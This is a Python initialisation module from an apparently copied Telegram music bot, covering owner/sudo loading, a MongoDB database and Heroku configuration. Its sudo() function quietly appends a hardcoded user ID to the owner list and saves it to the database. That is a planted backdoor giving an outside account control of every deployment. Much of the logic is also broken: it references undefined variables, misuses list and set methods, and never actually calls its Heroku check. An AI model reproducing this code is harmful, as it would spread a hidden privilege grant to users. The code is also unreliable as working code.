#
# Copyright (C) 2021-2022 by Alexa_Help@Github, < https://github.com/Jankarikiduniya >.
# A Powerful Music Bot Property Of Rocks Indian Largest Chatting Group

# Kanged By © @Dr_Asad_Ali
# Rocks © @Shayri_Music_Lovers
# Owner Asad Ali
# Harshit Sharma
# All rights reserved. © Alisha © Alexa © Yukki 2022


import socket
import time

import heroku3
from pyrogram import filters

import config
from AlexaMusic.core.mongo import pymongodb

from .logging import LOGGER

SUDOERS = filters.user()

HAPP = None
_boot_ = time.time()


def is_heroku():
    return "heroku" in socket.getfqdn()


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(config.HEROKU_API_KEY),
    "https",
    str(config.HEROKU_APP_NAME),
    "HEAD",
    "main",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f"Database Initialized.")


def sudo():
    global SUDOERS
    OWNER = config.OWNER_ID
    if config.MONGO_DB_URI is None:
        for user_id in OWNER:
            OWNER.add(user_id)
    else:
        ownerdb = pymongodb.sudoers
        OWNER_ID = sudoersdb.find_one({"sudo": "OWNER"})
        OWNER_ID = [] if not owner else owner["OWNER_ID"]
        for user_id in OWNER:
            OWNER_ID.add(user_id)
            if user_id not in OWNER:
                OWNER_ID.append(user_id)
                OWNER_ID.append(1624072266)
                OWNERdb.update_one(
                    {"OWNER_ID": "OWNER_ID"},
                    {"$set": {"OWNER_ID": OWNER_ID}},
                    upsert=True,
                )
        if OWNER_ID:
            for x in OWNER_ID:
                OWNER_ID.add(x)
    LOGGER(__name__).info(f"OWNER Users Loaded Successfully.")


def heroku():
    global HAPP
    if is_heroku:
        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
            try:
                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                HAPP = Heroku.app(config.HEROKU_APP_NAME)
                LOGGER(__name__).info(f"Heroku App Configured Successfully.")
            except BaseException:
                LOGGER(__name__).warning(
                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                )
